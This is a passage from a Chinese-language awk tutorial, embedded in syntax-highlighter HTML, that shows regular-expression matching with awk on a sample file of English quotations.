class=\"crayon-i\">twitter</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">120</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">5000</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>上面表示如果第 3 列字段小于 5500 的时候就会执行后面的 <code>print $0</code>，很像 C 语言和 PHP 的语法对不对。 想到这里有一句话不知当讲不当讲，那就是 PHP 是世界上最好的语言。。。 我可能喝多了， 但是突然想起来我好像从来不喝酒。。。—_—</p>\n<p><strong>在 awk 中使用正则表达式</strong></p>\n<p>在 awk 中支持正则表达式的使用，如果你还对正则表达式不是很了解，请先停下来，上 google 去搜一下。</p>\n<p>比如现在我们有这么一个文件 poetry.txt 里面都是我写的诗，不要问我为什么那么的有才华。内容如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afd4529114000\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nThis above all: to thine self be true\r\nThere is nothing either good or bad, but thinking makes it so\r\nThere’s a special providence in the fall of a sparrow\r\nNo matter how dark long, may eventually in the day arrival</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afd4529114000-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afd4529114000-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afd4529114000-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afd4529114000-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afd4529114000-1\"><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">above </span><span class=\"crayon-v\">all</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">thine </span><span class=\"crayon-r\">self</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be </span><span class=\"crayon-t\">true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afd4529114000-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">so</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afd4529114000-3\"><span class=\"crayon-i\">There</span>’<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">special </span><span class=\"crayon-e\">providence </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">fall </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sparrow</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afd4529114000-4\"><span class=\"crayon-e\">No </span><span class=\"crayon-e\">matter </span><span class=\"crayon-e\">how </span><span class=\"crayon-e\">dark </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">may </span><span class=\"crayon-e\">eventually </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">day </span><span class=\"crayon-v\">arrival</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p><strong>使用正则表达式匹配字符串 “There” ，将包含这个字符串的行打印并输出</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afd7115517968\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/There/{print $0}' poetry.txt\r\nThere is nothing either good or bad, but thinking makes it so\r\nThere’s a special providence in the fall of a sparrow</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afd7115517968-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afd7115517968-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afd7115517968-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afd7115517968-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/There/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afd7115517968-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">so</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afd7115517968-3\"><span class=\"crayon-i\">There</span>’<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">special </span><span class=\"crayon-e\">providence </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">fall </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sparrow</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p><strong>使用正则表达式配一个包含字母 t 和字母 e ，并且 t 和 e 中间只能有任意单个字符的行</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afda307982127\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/t.e/{print $0}' poetry.txt\r\nThere is nothing either good or bad, but thinking makes it so\r\nThere’s a special providence in the fall of a sparrow\r\nNo matter how dark long, may eventually in the day arrival</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afda307982127-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afda307982127-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afda307982127-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afda307982127-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afda307982127-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/t.e/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afda307982127-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">so</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afda307982127-3\"><span class=\"crayon-i\">There</span>’<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">special </span><span class=\"crayon-e\">providence </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">fall </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sparrow</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afda307982127-4\"><span class=\"crayon-e\">No </span><span class=\"crayon-e\">matter </span><span class=\"crayon-e\">how </span><span class=\"crayon-e\">dark </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">may </span><span class=\"crayon-e\">eventually </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">day </span><span class=\"crayon-v\">arrival</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>如果只想匹配单纯的字符串 “t.e”， 那正则表达式就是这样的 <code>/t\\.e/</code> ，用反斜杠来转义 <code>.</code> 符号 因为 <code>.</code> 在正则表达式里面表示任意单个字符。</p>\n<p><strong>使用正则表达式来匹配所有以 “The” 字符串开头的行</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afdd104969724\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/^The/{print $0}' poetry.txt\r\nThere is nothing either good or bad, but thinking makes it so\r\nThere’s a special providence in the fall of a sparrow</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afdd104969724-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afdd104969724-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afdd104969724-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afdd104969724-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/^The/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afdd104969724-2\"><span class=\"crayon-e\">There </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">nothing </span><span class=\"crayon-e\">either </span><span class=\"crayon-e\">good </span><span class=\"crayon-st\">or</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">bad</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">but </span><span class=\"crayon-e\">thinking </span><span class=\"crayon-e\">makes </span><span class=\"crayon-e\">it </span><span class=\"crayon-e\">so</span></div><div class=\"crayon-line\" id=\"crayon-594bd11b2afdd104969724-3\"><span class=\"crayon-i\">There</span>’<span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">special </span><span class=\"crayon-e\">providence </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">fall </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sparrow</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>在正则表达式中 <code>^</code> 表示以某某字符或者字符串开头。</p>\n<p><strong>使用正则表达式来匹配所有以 “true” 字符串结尾的行</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afe1813680472\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/true$/{print $0}' poetry.txt\r\nThis above all: to thine self be true</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afe1813680472-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afe1813680472-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afe1813680472-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/true$/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afe1813680472-2\"><span class=\"crayon-r\">This</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">above </span><span class=\"crayon-v\">all</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">thine </span><span class=\"crayon-r\">self</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">be </span><span class=\"crayon-t\">true</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>在正则表达式中 <code>$</code> 表示以某某字符或者字符串结尾。</p>\n<p><strong>又一个正则表达式例子如下</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afe4980916927\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ awk '/m[a]t/{print $0}' poetry.txt\r\nNo matter how dark long, may eventually in the day arrival</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bd11b2afe4980916927-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bd11b2afe4980916927-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bd11b2afe4980916927-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">awk</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'/m[a]t/{print $0}'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">poetry</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">txt</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bd11b2afe4980916927-2\"><span class=\"crayon-e\">No </span><span class=\"crayon-e\">matter </span><span class=\"crayon-e\">how </span><span class=\"crayon-e\">dark </span><span class=\"crayon-t\">long</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">may </span><span class=\"crayon-e\">eventually </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">day </span><span class=\"crayon-v\">arrival</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>上面这个正则表达式 <code>/m[a]t/</code> 表示匹配包含字符 m ，然后接着后面还要包含中间方括号中表示的单个字符 a ，最后还要包含字符 t 的行，输出结果中只有单词 “matter” 符合这个正则表达式的匹配。因为正则表达式 <code>[a]</code> 方括号中表示匹配里面的任意单个字符。</p>\n<p><strong>继续上面的一个新例子如下</strong></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bd11b2afe7914550301\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div 